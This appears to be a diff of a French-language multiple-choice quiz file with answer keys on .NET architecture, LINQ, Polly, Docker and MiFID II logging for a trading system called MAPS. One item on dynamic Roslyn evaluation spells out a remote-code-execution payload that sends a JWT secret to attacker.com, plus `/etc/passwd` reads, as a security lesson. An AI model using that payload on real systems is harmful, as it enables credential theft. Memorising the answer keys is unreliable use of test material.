-      "question": "[Refactoring + Performance] Le service de référentiel SQL exécute une requête `SELECT * FROM Instruments` à chaque appel de pricing (200ms, 50k lignes). Comment optimiser ?",
+      "question": "[Refactoring + LINQ] Un service MAPS exécute `var instruments = _context.Instruments.ToList().Where(i => i.UnderlyingId == id).Select(i => new InstrumentDto(i)).ToList()`. Mesurez l'impact et refactorisez.",
       "options": [
-        "Migrer la table vers MongoDB pour des lectures plus rapides.",
-        "Index covering sur les colonnes de filtrage (`ISIN`, `UnderlyingId`) + `SELECT` uniquement les colonnes nécessaires + cache Redis avec TTL (données stables) + `async/await` pour libérer les threads pendant l'I/O SQL.",
-        "Augmenter le timeout SQL de 30s à 120s.",
-        "Utiliser `Parallel.ForEach` sur les résultats SQL."
+        "Le code est correct — `ToList()` est nécessaire avant `Where()`.",
+        "`.ToList()` avant `Where()` charge 500k lignes en mémoire. Correction : `var dtos = await _context.Instruments.Where(i => i.UnderlyingId == id).Select(i => new InstrumentDto(i.Isin, i.Strike, i.Maturity)).AsNoTracking().ToListAsync(ct)` — SQL filtré côté serveur.",
+        "Remplacer `_context.Instruments` par `_context.Instruments.AsQueryable()` suffit.",
+        "La solution est d'ajouter un index SQL — le LINQ est correct."
       ],
-      "answer": "Index covering sur les colonnes de filtrage (`ISIN`, `UnderlyingId`) + `SELECT` uniquement les colonnes nécessaires + cache Redis avec TTL (données stables) + `async/await` pour libérer les threads pendant l'I/O SQL.",
-      "explanation": "Optimisation du référentiel (mission explicite) : (1) `SELECT *` → `SELECT ISIN, Strike, Maturity, UnderlyingId` — réduction du payload réseau et utilisation possible d'un covering index. (2) Index : `CREATE INDEX IX_Instruments_ISIN ON Instruments(ISIN) INCLUDE(Strike, Maturity)` — O(log n) au lieu de full scan. (3) Cache Redis : les instruments ne changent pas en intraday — TTL de 4h, un seul appel SQL par ISIN. (4) `await conn.QueryAsync()` (Dapper) — libère les threads HTTP pendant l'I/O. Combinaison : 200ms → < 1ms (cache hit)."
+      "answer": "`.ToList()` avant `Where()` charge 500k lignes en mémoire. Correction : `var dtos = await _context.Instruments.Where(i => i.UnderlyingId == id).Select(i => new InstrumentDto(i.Isin, i.Strike, i.Maturity)).AsNoTracking().ToListAsync(ct)` — SQL filtré côté serveur.",
+      "explanation": "Analyse de l'anti-pattern : `.ToList()` sur `IQueryable` force l'exécution immédiate → `SELECT * FROM Instruments` → 500k lignes transférées en RAM. Puis `.Where()` filtre en C# les 500k lignes → garde 50. SQL généré correct : `SELECT ISIN, Strike, Maturity FROM Instruments WHERE UnderlyingId = @id`. `.AsNoTracking()` supprime le change tracking (read-only). `.ToListAsync(ct)` passe le `CancellationToken`. `Select(new InstrumentDto(...))` projette uniquement les colonnes nécessaires → covering index possible. Gain : 500k→50 lignes transférées, mémoire ×10000 réduite."
     },
     {
-      "question": "[Anti-pattern + Multithreading] Un développeur utilise `lock(this)` dans la méthode `Price()` d'une `EuropeanCall` pour protéger l'accès à la `VolatilitySurface`. Quelle violation commet-il ?",
+      "question": "[Anti-pattern + Sécurité] Une API MAPS accepte `POST /api/v1/pricing/calculate` avec `{ \"formula\": \"S * K * Math.Exp(-r*T)\" }` et évalue dynamiquement avec Roslyn `CSharpScript.EvaluateAsync(request.Formula)`. Diagnostic et correction.",
       "options": [
-        "Aucune — `lock(this)` est la bonne pratique pour la thread-safety.",
-        "`lock(this)` dans `Price()` sérialise toutes les évaluations parallèles — le gain de `Parallel.ForEach` est annulé. Solution : `VolatilitySurface` immutable lue sans lock par N threads simultanément.",
-        "Le lock doit être sur la `VolatilitySurface`, pas sur `this`.",
-        "Il faut utiliser `SemaphoreSlim` à la place de `lock`."
+        "C'est acceptable si l'endpoint est authentifié par JWT.",
+        "Remote Code Execution critique — un trader malveillant peut exécuter `System.IO.File.ReadAllText(\"/etc/passwd\")` ou `System.Diagnostics.Process.Start(...)`. Correction : whitelist des modèles via enum (`BlackScholes`, `Heston`), paramétrage des inputs numériques.",
+        "Le seul risque est une dégradation des performances avec des formules complexes.",
+        "Ajouter `[Authorize(Policy=\"CanPrice\")]` suffit à protéger l'endpoint."
       ],
-      "answer": "`lock(this)` dans `Price()` sérialise toutes les évaluations parallèles — le gain de `Parallel.ForEach` est annulé. Solution : `VolatilitySurface` immutable lue sans lock par N threads simultanément.",
-      "explanation": "Anti-pattern classique en moteur de pricing : `lock(this)` dans `Price()` → toutes les options du book s'exécutent séquentiellement, éliminant le bénéfice du parallélisme. Solution correcte : rendre `VolatilitySurface` immutable (pattern Immutable Object). À chaque recalibration, créer une nouvelle instance et swapper atomiquement (`Interlocked.Exchange`). Les lectures parallèles sur une instance immutable sont thread-safe sans lock — zéro contention. Performance : book de 500 options → calcul ×32 plus rapide sur un serveur 32 cœurs."
+      "answer": "Remote Code Execution critique — un trader malveillant peut exécuter `System.IO.File.ReadAllText(\"/etc/passwd\")` ou `System.Diagnostics.Process.Start(...)`. Correction : whitelist des modèles via enum (`BlackScholes`, `Heston`), paramétrage des inputs numériques.",
+      "explanation": "RCE en CIB : même un utilisateur authentifié (JWT valide) peut être malveillant ou son token peut être compromis. `CSharpScript.EvaluateAsync` exécute du code arbitraire dans le process du serveur avec ses permissions. Payload : `{ formula: \"new System.Net.WebClient().DownloadString('http://attacker.com/exfil?key=' + System.Environment.GetEnvironmentVariable('Jwt__Secret'))\" }` — exfiltre la clé JWT. Correction : `BookingRequest.PricingModel` est un `enum PricingModel { BlackScholes, Heston, SABR }` — validation exhaustive, pas d'évaluation dynamique. Les inputs (S, K, r, T) sont des `decimal` fortement typés."
     },
     {
-      "question": "[Code → Identification] `channel.BasicPublish(exchange: \"pricing\", routingKey: \"greeks.computed\", body: Encoding.UTF8.GetBytes(JsonSerializer.Serialize(greeks)))`. Quel pattern d'architecture illustre ce code RabbitMQ ?",
+      "question": "[Architecture + Docker] Comment architecturer les containers MAPS pour que `BookingService` (.NET 8) communique avec `SophisAdapterService` (.NET 4.8 Windows) sans couplage direct ?",
       "options": [
-        "Request-Response synchrone entre deux services.",
-        "Event-Driven Architecture — le service de pricing publie un événement `GreeksComputed` sur RabbitMQ, découplant le producteur (calcul) des consommateurs (blotter, RMS, PMS).",
-        "Batch processing — les Greeks sont accumulés avant d'être envoyés.",
-        "Circuit breaker — le message est envoyé seulement si RabbitMQ est disponible."
+        "Installer .NET 4.8 dans le container .NET 8 — les deux runtimes coexistent.",
+        "`SophisAdapterService` hébergé sur IIS Windows (pas containerisé ou Windows container). `BookingService` l'appelle via REST `HttpClient` typé avec Polly. Dans Docker Compose dev : `sophis-adapter: image: maps-sophis-adapter-win` + `booking-api: depends_on: [sophis-adapter]`.",
+        "Utiliser la mémoire partagée entre les deux processus via `MemoryMappedFile`.",
+        "Compiler les deux en netstandard2.0 pour partager un runtime commun."
       ],
-      "answer": "Event-Driven Architecture — le service de pricing publie un événement `GreeksComputed` sur RabbitMQ, découplant le producteur (calcul) des consommateurs (blotter, RMS, PMS).",
-      "explanation": "EDA appliqué au pricing CIB : le service MAPS calcule les Greeks et publie `greeks.computed` sur l'exchange RabbitMQ. Le blotter React s'abonne et rafraîchit l'affichage. Le RMS s'abonne et recalcule les limites de risque. Le PMS s'abonne et met à jour les positions. Chaque consommateur est indépendant — si le blotter est down, le RMS continue. Le routingKey `greeks.computed` permet aux consumers de filtrer les événements qui les intéressent. Ce découplage est fondamental dans une architecture microservices CIB."
+      "answer": "`SophisAdapterService` hébergé sur IIS Windows (pas containerisé ou Windows container). `BookingService` l'appelle via REST `HttpClient` typé avec Polly. Dans Docker Compose dev : `sophis-adapter: image: maps-sophis-adapter-win` + `booking-api: depends_on: [sophis-adapter]`.",
+      "explanation": "Réalité terrain CIB : les composants COM (Sophis) nécessitent Windows — ils ne tournent pas dans un container Linux. Architecture hybride : `SophisAdapterService` = service Windows Server/IIS qui expose une REST API interne (`/api/sophis/isin/{id}`). `BookingService` containerisé Linux l'appelle via `HttpClient`. Isolation totale : si l'adapter Sophis tombe, le circuit breaker Polly l'isole. Les deux peuvent être déployés indépendamment. En dev : Docker Compose avec `platform: windows` pour le container Sophis ou mock `ISophisAdapter` local."
     },
     {
-      "question": "[Situation → Architecture] Le service de booking reçoit la même requête deux fois à cause d'un retry réseau (timeout de 5s). Comment garantir qu'un seul trade est créé dans Sophis ?",
+      "question": "[Situation → Performance] Le service de référentiel MAPS prend 500ms par requête. Proposez une stratégie d'optimisation complète en ordonnant les interventions par impact décroissant.",
       "options": [
-        "Utiliser un `lock` autour de l'appel Sophis.",
-        "Idempotency-Key : le client génère un UUID par intention de booking, le service vérifie en base si cette clé existe déjà — si oui, retourner le résultat précédent sans re-booker dans Sophis.",
-        "Configurer le timeout réseau à 30s pour éviter les retries.",
-        "Utiliser `Parallel.For` pour détecter les doublons."
+        "1. Augmenter la RAM → 2. Migrer vers NoSQL → 3. Ajouter des serveurs.",
+        "1. `EXPLAIN ANALYZE` → index covering SQL (500ms → 5ms) → 2. `async/await` Dapper + `.AsNoTracking()` (libération threads) → 3. Cache Redis L3 TTL 4h (5ms → <2ms 95% du temps) → 4. `IMemoryCache` L2 TTL 30min (<2ms → <0.5ms) → 5. `ConcurrentDictionary` L1 hot path (<0.5ms → <0.1ms) → 6. `ArrayPool` si parsing intensif.",
+        "1. Réécrire en Go → 2. Changer la base de données → 3. Ajouter du hardware.",
+        "1. Connection pooling → 2. Stored procedures → 3. NoSQL migration."
       ],
-      "answer": "Idempotency-Key : le client génère un UUID par intention de booking, le service vérifie en base si cette clé existe déjà — si oui, retourner le résultat précédent sans re-booker dans Sophis.",
-      "explanation": "Idempotence de l'API booking CIB : un double booking dans Sophis = deux trades réels dans le référentiel → erreur de position, impactant le P&L et les limites de risque. Pattern : `POST /api/v1/booking` avec header `Idempotency-Key: uuid`. Le service stocke `(key → tradeId)` en base. Retry avec la même clé → retourne le tradeId déjà créé. Clé différente → nouveau trade. TTL 24h pour les clés. Critique pour tous les endpoints de mutation en CIB."
+      "answer": "1. `EXPLAIN ANALYZE` → index covering SQL (500ms → 5ms) → 2. `async/await` Dapper + `.AsNoTracking()` (libération threads) → 3. Cache Redis L3 TTL 4h (5ms → <2ms 95% du temps) → 4. `IMemoryCache` L2 TTL 30min (<2ms → <0.5ms) → 5. `ConcurrentDictionary` L1 hot path (<0.5ms → <0.1ms) → 6. `ArrayPool` si parsing intensif.",
+      "explanation": "Ordre d'impact en CIB : L'index SQL est la correction la plus impactante — un full scan sur 500k lignes prend 500ms, un index B-Tree 5ms. Sans mesurer d'abord (`EXPLAIN ANALYZE`), on optimise peut-être le mauvais goulot. L'async libère les threads (scalabilité, pas latence). Le cache Redis réduit les appels SQL de 95%+ en période de marché (les mêmes ISIN sont demandés en boucle). Le cache mémoire local réduit encore les round-trips Redis. Le L1 `ConcurrentDictionary` élimine même l'overhead de l'IMemoryCache pour les 100-200 ISIN ultra-chauds. BenchmarkDotNet mesure chaque étape."
     },
     {
-      "question": "[Thème A → Thème B] Comment le principe `ISP` (Interface Segregation) s'applique-t-il lors du refactoring de l'interface monolithique `ISophisService` qui expose 30 méthodes ?",
+      "question": "[Thème A → Thème B] Comment le pattern Strangler Fig s'applique-t-il pour extraire le service de booking du monolithe MAPS .NET 4.8 vers un microservice .NET 8, sans interruption ?",
       "options": [
-        "Garder l'interface monolithique — plus simple à maintenir.",
-        "Décomposer en interfaces spécialisées : `ISophisInstrumentRepository` (GetISIN, GetInstrument), `ISophisMarketDataProvider` (GetSpot, GetVol), `ISophisBookingService` (BookTrade) — chaque service dépend uniquement de l'interface qu'il utilise.",
-        "Supprimer toutes les interfaces et accéder à Sophis directement.",
-        "Créer une interface héritant de toutes les autres."
+        "Réécrire entièrement le monolithe en .NET 8 en une fois.",
+        "1. Introduire YARP devant le monolithe. 2. Créer `BookingService` .NET 8 avec les mêmes endpoints. 3. YARP route 10% du trafic booking vers le nouveau service (canary). 4. Valider. 5. Augmenter progressivement jusqu'à 100%. 6. Retirer le code booking du monolithe.",
+        "Dupliquer le monolithe et déployer la version .NET 8 en blue-green.",
+        "Utiliser `#if NET8_0` dans le monolithe pour activer le nouveau code."
       ],
-      "answer": "Décomposer en interfaces spécialisées : `ISophisInstrumentRepository` (GetISIN, GetInstrument), `ISophisMarketDataProvider` (GetSpot, GetVol), `ISophisBookingService` (BookTrade) — chaque service dépend uniquement de l'interface qu'il utilise.",
-      "explanation": "ISP appliqué au refactoring Sophis : une interface de 30 méthodes force chaque service à dépendre de méthodes inutilisées. Le service ISIN n'a besoin que de `GetISIN` et `GetInstrument`. Le service de pricing n'a besoin que de `GetSpot` et `GetVol`. En test unitaire : mocker `ISophisInstrumentRepository` (2 méthodes) est trivial ; mocker `ISophisService` (30 méthodes) est un cauchemar. ISP réduit le couplage, simplifie les tests et rend explicites les dépendances de chaque service."
+      "answer": "1. Introduire YARP devant le monolithe. 2. Créer `BookingService` .NET 8 avec les mêmes endpoints. 3. YARP route 10% du trafic booking vers le nouveau service (canary). 4. Valider. 5. Augmenter progressivement jusqu'à 100%. 6. Retirer le code booking du monolithe.",
+      "explanation": "Strangler Fig dans MAPS : YARP (reverse proxy C#) est le strangler. Il intercepte toutes les requêtes — initialement 100% vers le monolithe .NET 4.8. On déploie `BookingService` .NET 8 en parallèle. YARP route progressivement (feature flag ou pourcentage) le trafic `/api/v1/booking` vers le nouveau service. Le monolithe continue de fonctionner pour les autres routes. Si le nouveau service a un bug, YARP rebascule vers le monolithe en secondes (rollback sans redéploiement). Quand 100% du trafic est stable sur le nouveau service, le code booking est supprimé du monolithe."
     },
     {
-      "question": "[Situation → Multi-concepts] Un service de pricing MAPS recalcule la surface de volatilité toutes les 30 secondes via DataSynapse, publie sur RabbitMQ, et un service de booking lit la dernière surface depuis Redis avant de pricer. Identifiez les patterns.",
+      "question": "[Anti-pattern + Multithreading] Un développeur MAPS utilise `async void` dans un handler RabbitMQ : `consumer.ReceivedAsync += async void (sender, args) => { await ProcessPricingAsync(args); }`. Quelle violation ?",
       "options": [
-        "CRUD + REST + SQL",
-        "Calcul distribué (DataSynapse) + EDA (RabbitMQ publish) + Cache-aside (Redis lecture) + Eventual consistency (délai propagation vol surface) + Immutable Value Object (surface immuable)",
-        "Singleton + Factory + Observer",
-        "Blue-green deployment + CI/CD + HTTPS"
+        "Aucune — `async void` est équivalent à `async Task` dans les event handlers.",
+        "`async void` ne peut pas être attendu — si `ProcessPricingAsync` lève une exception, elle n'est pas capturée et plante le process. Les exceptions `async void` sont non-catchables et non-observables. Correction : `async Task` + `try/catch` explicite.",
+        "Le problème est uniquement que `async void` est plus lent que `async Task`.",
+        "`async void` n'est pas supporté dans les event handlers RabbitMQ."
       ],
-      "answer": "Calcul distribué (DataSynapse) + EDA (RabbitMQ publish) + Cache-aside (Redis lecture) + Eventual consistency (délai propagation vol surface) + Immutable Value Object (surface immuable)",
-      "explanation": "Analyse multi-patterns : DataSynapse = calcul distribué sur grille de serveurs (parallélisme massif pour la calibration). RabbitMQ publish = EDA, les consumers (booking, risk) reçoivent l'update sans polling. Redis = cache-aside pour la lecture rapide de la surface. Eventual consistency : entre la calibration et la mise à jour Redis, il y a un délai — le service de booking peut pricer avec une surface légèrement périmée (acceptable si < 30s). Immutable Object : une fois créée, la surface n'est jamais modifiée — thread-safety sans lock."
+      "answer": "`async void` ne peut pas être attendu — si `ProcessPricingAsync` lève une exception, elle n'est pas capturée et plante le process. Les exceptions `async void` sont non-catchables et non-observables. Correction : `async Task` + `try/catch` explicite.",
+      "explanation": "Bug silencieux critique en CIB : `async void` → exception lors du traitement d'un message de pricing → `UnhandledExceptionHandler` du process → restart du container Docker → perte du contexte de calcul en cours. En production sur un desk actif : le service de pricing redémarre silencieusement, les trades en cours de calcul sont perdus. Correction : `consumer.ReceivedAsync += async (sender, args) => { try { await ProcessPricingAsync(args); await channel.BasicAckAsync(args.DeliveryTag, false); } catch (Exception ex) { _logger.LogError(ex, ...); await channel.BasicNackAsync(args.DeliveryTag, false, requeue: false); } }` — exception loguée, message rejeté vers la DLQ."
     },
     {
-      "question": "[Anti-pattern + .NET] Un service ASP.NET Core utilise `HttpContext.Current` pour récupérer l'identité du trader dans une méthode appelée par `Parallel.ForEach`. Quel problème ?",
+      "question": "[Situation → Architecture] L'API MAPS reçoit des pics de 2000 req/sec à l'ouverture du marché et seulement 50 req/sec en journée. Comment architecturer le scaling ?",
       "options": [
-        "Aucun — `HttpContext.Current` est thread-safe.",
-        "`HttpContext.Current` est un static context lié au thread de la requête HTTP — sous `Parallel.ForEach`, les threads de travail n'ont pas ce contexte. Il retourne null ou le mauvais contexte. Solution : capturer `HttpContext` en dehors et le passer explicitement.",
-        "Le problème est uniquement de performance.",
-        "`HttpContext.Current` n'existe pas dans .NET 8."
+        "Provisionner un serveur fixe pour 2000 req/sec en permanence.",
+        "Kubernetes HPA (Horizontal Pod Autoscaler) : scale de 2 pods (nuit) à 20 pods (ouverture marché) selon CPU/latence. `Channel<T>` bounded pour absorber les bursts. Redis rate limiter pour lisser les pics. Cache warming avant l'ouverture via `IHostedService`.",
+        "MSMQ queue illimitée absorbe tous les messages — pas besoin de scaling.",
+        "Augmenter le timeout HTTP de 30s à 5 minutes pendant les pics."
       ],
-      "answer": "`HttpContext.Current` est un static context lié au thread de la requête HTTP — sous `Parallel.ForEach`, les threads de travail n'ont pas ce contexte. Il retourne null ou le mauvais contexte. Solution : capturer `HttpContext` en dehors et le passer explicitement.",
-      "explanation": "Anti-pattern critique en CIB : l'identité du trader est nécessaire pour l'audit trail MiFID II et les vérifications d'autorisation. `HttpContext.Current` (pattern .NET Framework) est un ambient context stocké dans le TLS (Thread Local Storage) du thread de la requête. Sous `Parallel.ForEach`, les worker threads n'ont pas ce TLS. Solution : `var userId = User.Identity.Name;` dans le controller (thread HTTP), puis passer `userId` explicitement aux méthodes parallèles. En .NET 8/ASP.NET Core : `IHttpContextAccessor` injecté (thread-safe avec `AsyncLocal`)."
+      "answer": "Kubernetes HPA (Horizontal Pod Autoscaler) : scale de 2 pods (nuit) à 20 pods (ouverture marché) selon CPU/latence. `Channel<T>` bounded pour absorber les bursts. Redis rate limiter pour lisser les pics. Cache warming avant l'ouverture via `IHostedService`.",
+      "explanation": "Architecture de scaling CIB : le marché ouvre à 9h — pic prévisible. HPA avec métriques personnalisées (latence P99 via Prometheus) scale proactivement 15min avant l'ouverture. `Channel<T>` bounded absorbe les bursts courts sans perdre de requêtes (backpressure). Redis rate limiter distribué (partagé entre tous les pods) évite qu'un client sature l'API. Cache warming : `IHostedService` précharge Redis avec les ISIN et vols fréquents à 8h45 — la première requête de pricing ne touche pas SQL/Sophis à chaud. Coût optimisé : 2 pods à 0h, 20 pods à 9h-11h, redescente progressive."
     },
     {
-      "question": "[Refactoring + Architecture] Le service de pricing appelle synchroniquement le service de booking, le service de risk et le service de position après chaque calcul. La latence totale est 800ms. Comment refactoriser ?",
+      "question": "[Code → Identification] `services.AddHttpClient<ISophisAdapter, SophisHttpAdapter>(c => c.BaseAddress = new Uri(config[\"Sophis:Url\"])).AddResilienceHandler(\"sophis\", b => b.AddRetry(...).AddCircuitBreaker(...).AddTimeout(...));`. Qu'illustre ce code dans l'infrastructure MAPS ?",
       "options": [
-        "Augmenter le timeout à 2000ms.",
-        "Remplacer les appels synchrones chaînés par la publication d'un événement `PricingCompleted` sur RabbitMQ — booking, risk et position consomment de façon asynchrone et indépendante. Latence réduite à celle du calcul seul.",
-        "Utiliser `Task.WhenAll` sur les 3 appels synchrones.",
-        "Migrer vers gRPC pour réduire la latence des appels."
+        "La configuration d'un client RabbitMQ avec résilience.",
+        "Un `HttpClient` typé pour `ISophisAdapter` avec pipeline de résilience Polly intégré — retry exponentiel + circuit breaker + timeout — via le nouveau `Microsoft.Extensions.Http.Resilience` (.NET 8).",
+        "Un service de discovery pour trouver l'URL de Sophis dynamiquement.",
+        "La configuration d'un API Gateway vers Sophis."
       ],
-      "answer": "Remplacer les appels synchrones chaînés par la publication d'un événement `PricingCompleted` sur RabbitMQ — booking, risk et position consomment de façon asynchrone et indépendante. Latence réduite à celle du calcul seul.",
-      "explanation": "Refactoring EDA : appels synchrones chaînés = couplage temporel fort et latence cumulative (200ms + 300ms + 300ms = 800ms). Le service de pricing attend que booking, risk et position aient tous répondu. Avec RabbitMQ : le pricing publie `PricingCompleted` (< 1ms) et répond immédiatement au trader. Booking, risk et position consomment en async et indépendamment. Si un service est lent/down, les autres continuent. Gain : latence de réponse = temps de calcul seul (ex: 50ms). `Task.WhenAll` (option C) aide mais maintient le couplage temporel."
+      "answer": "Un `HttpClient` typé pour `ISophisAdapter` avec pipeline de résilience Polly intégré — retry exponentiel + circuit breaker + timeout — via le nouveau `Microsoft.Extensions.Http.Resilience` (.NET 8).",
+      "explanation": "`AddHttpClient<ISophisAdapter, SophisHttpAdapter>` : enregistre un `HttpClient` géré (connection pooling, DNS refresh, timeouts) typé sur l'interface. `.AddResilienceHandler` (.NET 8 `Microsoft.Extensions.Http.Resilience`) : pipeline Polly v8 déclaratif attaché à ce client. Avantages vs Polly v7 manuel : `AddRetry`, `AddCircuitBreaker`, `AddTimeout` sont composés dans le bon ordre automatiquement. Le `SophisHttpAdapter` reçoit l'`HttpClient` par injection — il n'a pas à gérer la résilience lui-même. En CIB : Sophis peut être instable pendant les maintenances de nuit — ce pipeline le rend transparent pour l'API de booking."
     },
     {
-      "question": "[Code → Identification] `var policy = Policy.Handle<SophisException>().WaitAndRetryAsync(3, i => TimeSpan.FromSeconds(Math.Pow(2, i))).WrapAsync(Policy.TimeoutAsync(TimeSpan.FromSeconds(5)));`. Qu'implémente ce code Polly ?",
+      "question": "[Thème ↔ Outil] Dans MAPS, quel outil permet de mesurer précisément que le refactoring du service référentiel a réduit les allocations GC de 400MB à 0MB par pricing ?",
       "options": [
-        "Un circuit breaker qui coupe les appels après 3 erreurs.",
-        "Un retry avec backoff exponentiel (1s, 2s, 4s) combiné avec un timeout global de 5s par tentative — résilience pour les appels Sophis instables.",
-        "Un rate limiter à 3 requêtes par seconde vers Sophis.",
-        "Un load balancer entre plusieurs instances Sophis."
+        "Azure DevOps build logs — les temps de compilation reflètent les allocations.",
+        "BenchmarkDotNet avec le `MemoryDiagnoser` : `[MemoryDiagnoser][Benchmark] public void PriceWithArrayPool()` → colonnes `Gen0`, `Gen1`, `Gen2`, `Allocated` comparent exactement avant/après.",
+        "Visual Studio Diagnostic Tools en mode debug — suffisant pour la production.",
+        "Les health checks Kubernetes mesurent les allocations GC."
       ],
-      "answer": "Un retry avec backoff exponentiel (1s, 2s, 4s) combiné avec un timeout global de 5s par tentative — résilience pour les appels Sophis instables.",
-      "explanation": "Polly combiné : `WaitAndRetryAsync(3, i => Math.Pow(2, i))` → si l'appel Sophis échoue, réessayer après 2^1=2s, 2^2=4s, 2^3=8s. Le backoff exponentiel évite de saturer Sophis qui se remet en route. `TimeoutAsync(5)` → chaque tentative est timeout après 5s (évite de bloquer un thread 30s sur un Sophis bloqué). Combiné avec `.WrapAsync()` : l'ordre d'application est timeout > retry. En CIB, les appels aux systèmes legacy (Sophis, DataSynapse) nécessitent impérativement ce type de politique de résilience."
+      "answer": "BenchmarkDotNet avec le `MemoryDiagnoser` : `[MemoryDiagnoser][Benchmark] public void PriceWithArrayPool()` → colonnes `Gen0`, `Gen1`, `Gen2`, `Allocated` comparent exactement avant/après.",
+      "explanation": "BenchmarkDotNet avec `[MemoryDiagnoser]` : rapport produit exactement `Gen0 collections`, `Gen1 collections`, `Gen2 collections`, `Allocated` (bytes total). `PriceBookSequential` : Gen0=420, Allocated=403MB. `PriceBookWithArrayPool` : Gen0=0, Allocated=120B. Preuve irréfutable du gain pour la code review et la documentation de la mission. Intégration CI : `dotnet run -c Release --project Benchmarks` + assertion sur `Allocated < threshold`. Visual Studio Diagnostic Tools = interactif/dev, pas reproductible en CI. Azure DevOps = logs de build, pas de métriques mémoire runtime."
     },
     {
-      "question": "[Erreur contextuelle + MiFID II] Un service de booking ne logge pas l'identité du trader, l'horodatage et l'instrument pour chaque trade booké. Quelle violation réglementaire en CIB ?",
+      "question": "[Multi-concepts] Dans le pipeline `HTTP Request → JWT Middleware → Rate Limiter → Controller → IBookingService → IIsinService → ISophisAdapter → IMessageBus (RabbitMQ) → SQL Audit`, identifiez les 5 patterns d'architecture.",
       "options": [
-        "Aucune — les logs sont optionnels en CIB.",
-        "Violation MiFID II Article 25 : obligation de conservation de tous les ordres et trades (identité, horodatage, instrument, prix, quantité) pendant 5 ans pour les audits régulateurs.",
-        "Violation uniquement du RGPD — les identités ne doivent pas être loguées.",
-        "Violation interne uniquement, sans conséquence réglementaire."
+        "CRUD + REST + SQL + Docker + CI/CD",
+        "Pipeline middleware (chain of responsibility) + Dependency Injection (interfaces injectées) + Cache-aside (ISIN) + Circuit Breaker (Sophis) + Event-Driven Architecture (RabbitMQ publish)",
+        "Singleton + Factory + Observer + Builder + Facade",
+        "MVC + Repository + Specification + CQRS + Event Sourcing"
       ],
-      "answer": "Violation MiFID II Article 25 : obligation de conservation de tous les ordres et trades (identité, horodatage, instrument, prix, quantité) pendant 5 ans pour les audits régulateurs.",
-      "explanation": "MiFID II (Markets in Financial Instruments Directive II) impose des obligations d'archivage strictes en CIB : chaque booking doit être tracé avec l'identité du trader/sales, l'horodatage précis (microsecondes pour certains instruments), l'ISIN, la quantité, le prix, la contrepartie. Conservation 5 ans minimum. Défaut = sanction AMF/FCA potentiellement très lourde. Dans MAPS : structured logging `_logger.LogInformation(\"Trade booked {TradeId} {ISIN} {Trader} {Notional} {Timestamp}\", ...)` + export vers un store d'archivage immuable (Kafka + S3)."
+      "answer": "Pipeline middleware (chain of responsibility) + Dependency Injection (interfaces injectées) + Cache-aside (ISIN) + Circuit Breaker (Sophis) + Event-Driven Architecture (RabbitMQ publish)",
+      "explanation": "Analyse du flux booking MAPS : Pipeline middleware = les middlewares sont une chain of responsibility — JWT, rate limiter, routing s'exécutent en séquence, chacun pouvant court-circuiter. DI = toutes les dépendances (`IBookingService`, `IIsinService`, `ISophisAdapter`, `IMessageBus`) injectées par constructeur. Cache-aside = `IIsinService` vérifie Redis/MemoryCache avant d'appeler Sophis. Circuit breaker Polly = `ISophisAdapter` protégé contre les pannes Sophis. EDA = `IMessageBus.PublishAsync(\"trade.booked\", event)` découple le booking de ses consommateurs (blotter, RMS, PMS)."
     },
     {
-      "question": "[Thème A → Thème B] Comment le modèle de Heston améliore-t-il Black-Scholes pour pricer un Autocall sur un sous-jacent avec skew prononcé ?",
+      "question": "[Erreur contextuelle + MiFID II] Un service MAPS log les erreurs avec `_logger.LogError(ex.Message)` uniquement, sans `userId`, `tradeId`, `isin` ni timestamp structuré. Quelle violation ?",
       "options": [
-        "Heston est identique à Black-Scholes mais plus rapide à calculer.",
-        "Black-Scholes suppose σ constante (surface plate) — Heston modélise la volatilité comme un processus stochastique (CIR), permettant de reproduire le skew et le terme structure de la surface implicite observée. Critique pour les produits sensibles à la vol (autocalls).",
-        "Heston est uniquement adapté aux options américaines.",
-        "Black-Scholes et Heston donnent le même prix pour les autocalls."
+        "Aucune — les logs d'erreurs n'ont pas d'exigences réglementaires.",
+        "Violation MiFID II article 25 (traçabilité) + impossibilité d'audit en cas de litige. Correction : `_logger.LogError(ex, \"BookingFailed {TradeId} {ISIN} {UserId} {Desk} {Notional}\", tradeId, isin, userId, desk, notional)` — structured logging avec toutes les dimensions métier.",
+        "La seule violation est une mauvaise pratique de développement sans impact réglementaire.",
+        "Il faut utiliser `Console.WriteLine` à la place de `_logger`."
       ],
-      "answer": "Black-Scholes suppose σ constante (surface plate) — Heston modélise la volatilité comme un processus stochastique (CIR), permettant de reproduire le skew et le terme structure de la surface implicite observée. Critique pour les produits sensibles à la vol (autocalls).",
-      "explanation": "Limitation Black-Scholes en pratique : volatilité implicite non constante en K et T (smile/skew). Heston (1993) : `dv = κ(θ-v)dt + ξ√v dW_v` où v est la variance stochastique. Paramètres : κ (vitesse de retour à la moyenne), θ (variance à long terme), ξ (vol de vol), ρ (corrélation spot-vol). Avantage : reproduit naturellement le skew négatif des actions (put implicite) et la term structure. Pour les autocalls (très sensibles à la volatilité sur des maturités 1-5 ans), Heston donne des prix plus fiables que Black-Scholes. Implémenté dans MAPS via calibration sur la surface de marché."
+      "answer": "Violation MiFID II article 25 (traçabilité) + impossibilité d'audit en cas de litige. Correction : `_logger.LogError(ex, \"BookingFailed {TradeId} {ISIN} {UserId} {Desk} {Notional}\", tradeId, isin, userId, desk, notional)` — structured logging avec toutes les dimensions métier.",
+      "explanation": "MiFID II impose : chaque trade (réussi ou échoué) doit être tracé avec identité du trader, instrument, horodatage, quantité, desk — pendant 5 ans. Un log `LogError(ex.Message)` sans contexte : si le régulateur AMF demande l'audit d'un trade suspect 3 ans plus tard, impossible de retrouver qui a booké quoi. Structured logging Serilog : `{TradeId}`, `{ISIN}`, `{UserId}` deviennent des propriétés indexées dans Elasticsearch/Splunk — requête `tradeId=abc-123` retrouve en secondes tous les événements liés. `LogError(ex, template, ...)` (avec la `Exception` en 1er argument) capture aussi la stack trace."
     },
     {
-      "question": "[Situation → Multi-concepts] Dans le pipeline Azure DevOps de MAPS, le build cible `net48;net8.0`. La CI échoue sur le target `net8.0` car une lib MSMQ n'est pas compatible. Comment résoudre ?",
+      "question": "[Ordre de dépendance] Dans l'infrastructure MAPS Docker Compose, quel est l'ordre correct de démarrage des services pour éviter les échecs au lancement ?",
       "options": [
-        "Supprimer la cible net8.0 du pipeline.",
-        "Wrapper l'import MSMQ dans une directive `#if NET48` + créer `IMsmqAdapter` + implémenter `RabbitMqAdapter` pour net8.0 — la CI passe sur les deux targets.",
-        "Downgrader toute la solution vers net48.",
-        "Ignorer l'erreur net8.0 dans le pipeline YAML."
+        "L'ordre ne compte pas — `depends_on` suffit.",
